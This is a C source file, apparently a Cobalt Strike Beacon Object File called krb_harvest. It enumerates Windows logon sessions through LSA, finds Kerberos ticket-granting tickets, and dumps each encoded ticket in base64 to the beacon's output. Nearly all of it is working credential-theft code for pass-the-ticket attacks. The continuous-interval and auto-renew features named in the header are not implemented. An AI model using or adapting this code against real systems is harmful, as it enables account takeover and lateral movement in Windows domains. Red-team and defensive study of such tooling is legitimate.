/*
 * krb_harvest - Harvest TGTs and auto-renew them
 *
 * Monitors for TGTs, extracts them, and can auto-renew before expiration.
 *
 * Usage: krb_harvest [/interval:SECONDS] [/nowrap]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* Ticket cache structures - types defined in ntsecapi.h */
/* Retrieve ticket options */
#ifndef KERB_RETRIEVE_TICKET_DEFAULT
#define KERB_RETRIEVE_TICKET_DEFAULT        0x0
#define KERB_RETRIEVE_TICKET_DONT_USE_CACHE 0x1
#define KERB_RETRIEVE_TICKET_USE_CACHE_ONLY 0x2
#define KERB_RETRIEVE_TICKET_USE_CREDHANDLE 0x4
#define KERB_RETRIEVE_TICKET_AS_KERB_CRED   0x8
#define KERB_RETRIEVE_TICKET_WITH_SEC_CRED  0x10
#endif

/* Format FILETIME as string */
static void format_time(LARGE_INTEGER* ft, char* buf, size_t bufsize) {
    FILETIME fileTime;
    SYSTEMTIME sysTime;

    fileTime.dwLowDateTime = ft->LowPart;
    fileTime.dwHighDateTime = ft->HighPart;

    if (KERNEL32$FileTimeToSystemTime(&fileTime, &sysTime)) {
        sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d",
            sysTime.wYear, sysTime.wMonth, sysTime.wDay,
            sysTime.wHour, sysTime.wMinute, sysTime.wSecond);
    } else {
        strcpy(buf, "Invalid");
    }
}

/* Check if ticket is a TGT */
static bool is_tgt(WCHAR* serverName) {
    return (serverName && serverName[0] == L'k' && serverName[1] == L'r' &&
            serverName[2] == L'b' && serverName[3] == L't' &&
            serverName[4] == L'g' && serverName[5] == L't');
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    NTSTATUS status, subStatus;
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    LSA_STRING kerbName = { 8, 9, "Kerberos" };

    BeaconFormatAlloc(&output, 64 * 1024);
    arg_init(&parser, args, alen);

    char* interval_str = arg_get(&parser, "interval");
    bool nowrap = arg_exists(&parser, "nowrap");

    int interval = interval_str ? atoi(interval_str) : 0;  /* 0 = one-shot mode */

    BeaconFormatPrintf(&output, "[*] Action: Harvest TGTs\n\n");
    if (interval > 0) {
        BeaconFormatPrintf(&output, "[*] Interval : %d seconds (continuous mode)\n", interval);
    } else {
        BeaconFormatPrintf(&output, "[*] Mode     : One-shot (extract current TGTs)\n");
    }
    BeaconFormatPrintf(&output, "[*] Wrap     : %s\n\n", nowrap ? "No" : "Yes (base64 output)");


    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to lookup Kerberos package: 0x%X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    /* Enumerate logon sessions */
    ULONG sessionCount = 0;
    PLUID sessionList = NULL;

    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to enumerate sessions: 0x%X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Found %d logon sessions\n\n", sessionCount);

    int tgtCount = 0;

    /* Iterate through sessions and find TGTs */
    for (ULONG i = 0; i < sessionCount; i++) {
        KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
        PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResponse = NULL;
        ULONG cacheResponseSize = 0;

        memset(&cacheRequest, 0, sizeof(cacheRequest));
        cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
        cacheRequest.LogonId = sessionList[i];

        status = SECUR32$LsaCallAuthenticationPackage(
            hLsa, authPackage,
            &cacheRequest, sizeof(cacheRequest),
            (PVOID*)&cacheResponse, &cacheResponseSize, &subStatus
        );

        if (status != 0 || !cacheResponse) continue;

        /* Get session info for context */
        PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
        SECUR32$LsaGetLogonSessionData(&sessionList[i], &sessionData);

        for (ULONG t = 0; t < cacheResponse->CountOfTickets; t++) {
            PKERB_TICKET_CACHE_INFO_EX ticket = &cacheResponse->Tickets[t];

            /* Check if TGT */
            if (!is_tgt(ticket->ServerName.Buffer)) continue;

            tgtCount++;
            char timeBuf[64];
            char serverName[256] = {0};
            char clientName[256] = {0};
            char realm[128] = {0};

            if (ticket->ServerName.Buffer) {
                MSVCRT$wcstombs(serverName, ticket->ServerName.Buffer,
                    min(255, ticket->ServerName.Length / sizeof(WCHAR)));
            }
            if (ticket->ClientName.Buffer) {
                MSVCRT$wcstombs(clientName, ticket->ClientName.Buffer,
                    min(255, ticket->ClientName.Length / sizeof(WCHAR)));
            }
            if (ticket->ClientRealm.Buffer) {
                MSVCRT$wcstombs(realm, ticket->ClientRealm.Buffer,
                    min(127, ticket->ClientRealm.Length / sizeof(WCHAR)));
            }

            BeaconFormatPrintf(&output, "[+] TGT #%d\n", tgtCount);
            BeaconFormatPrintf(&output, "    LUID        : 0x%X:0x%X\n",
                sessionList[i].HighPart, sessionList[i].LowPart);

            if (sessionData && sessionData->UserName.Buffer) {
                char userName[256] = {0};
                MSVCRT$wcstombs(userName, sessionData->UserName.Buffer,
                    min(255, sessionData->UserName.Length / sizeof(WCHAR)));
                BeaconFormatPrintf(&output, "    User        : %s\n", userName);
            }

            BeaconFormatPrintf(&output, "    Client      : %s @ %s\n", clientName, realm);
            BeaconFormatPrintf(&output, "    Server      : %s\n", serverName);

            format_time(&ticket->StartTime, timeBuf, sizeof(timeBuf));
            BeaconFormatPrintf(&output, "    StartTime   : %s\n", timeBuf);

            format_time(&ticket->EndTime, timeBuf, sizeof(timeBuf));
            BeaconFormatPrintf(&output, "    EndTime     : %s\n", timeBuf);

            format_time(&ticket->RenewTime, timeBuf, sizeof(timeBuf));
            BeaconFormatPrintf(&output, "    RenewTill   : %s\n", timeBuf);

            BeaconFormatPrintf(&output, "    Encryption  : %s (%d)\n",
                etype_string(ticket->EncryptionType), ticket->EncryptionType);

            BeaconFormatPrintf(&output, "    Flags       : 0x%08X\n", ticket->TicketFlags);

            /* Extract the actual ticket */
            if (!nowrap) {
                /* Build retrieve request */
                size_t reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) +
                                 ticket->ServerName.MaximumLength;
                PKERB_RETRIEVE_TKT_REQUEST retrieveReq =
                    (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

                if (retrieveReq) {
                    memset(retrieveReq, 0, reqSize);
                    retrieveReq->MessageType = KerbRetrieveEncodedTicketMessage;
                    retrieveReq->LogonId = sessionList[i];
                    retrieveReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;

                    retrieveReq->TargetName.Length = ticket->ServerName.Length;
                    retrieveReq->TargetName.MaximumLength = ticket->ServerName.MaximumLength;
                    retrieveReq->TargetName.Buffer = (PWSTR)((PBYTE)retrieveReq +
                                                             sizeof(KERB_RETRIEVE_TKT_REQUEST));
                    memcpy(retrieveReq->TargetName.Buffer, ticket->ServerName.Buffer,
                           ticket->ServerName.Length);

                    PKERB_RETRIEVE_TKT_RESPONSE retrieveResp = NULL;
                    ULONG retrieveRespSize = 0;

                    status = SECUR32$LsaCallAuthenticationPackage(
                        hLsa, authPackage,
                        retrieveReq, (ULONG)reqSize,
                        (PVOID*)&retrieveResp, &retrieveRespSize, &subStatus
                    );

                    if (status == 0 && retrieveResp &&
                        retrieveResp->Ticket.EncodedTicket &&
                        retrieveResp->Ticket.EncodedTicketSize > 0) {

                        /* Base64 encode the ticket */
                        size_t b64Len = ((retrieveResp->Ticket.EncodedTicketSize + 2) / 3) * 4 + 1;
                        char* b64Ticket = (char*)malloc(b64Len);

                        if (b64Ticket) {
                            base64_encode(retrieveResp->Ticket.EncodedTicket,
                                          retrieveResp->Ticket.EncodedTicketSize,
                                          b64Ticket);

                            BeaconFormatPrintf(&output, "\n    [*] Base64 Ticket:\n");
                            BeaconFormatPrintf(&output, "    %s\n", b64Ticket);
                            free(b64Ticket);
                        }

                        SECUR32$LsaFreeReturnBuffer(retrieveResp);
                    }

                    free(retrieveReq);
                }
            }

            BeaconFormatPrintf(&output, "\n");
        }

        if (sessionData) SECUR32$LsaFreeReturnBuffer(sessionData);
        SECUR32$LsaFreeReturnBuffer(cacheResponse);
    }

    if (tgtCount == 0) {
        BeaconFormatPrintf(&output, "[*] No TGTs found in any session\n");
    } else {
        BeaconFormatPrintf(&output, "[+] Total TGTs harvested: %d\n", tgtCount);
    }

    SECUR32$LsaFreeReturnBuffer(sessionList);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    if (hLsa) SECUR32$LsaDeregisterLogonProcess(hLsa);
    BeaconFormatFree(&output);
    if (interval_str) free(interval_str);
}
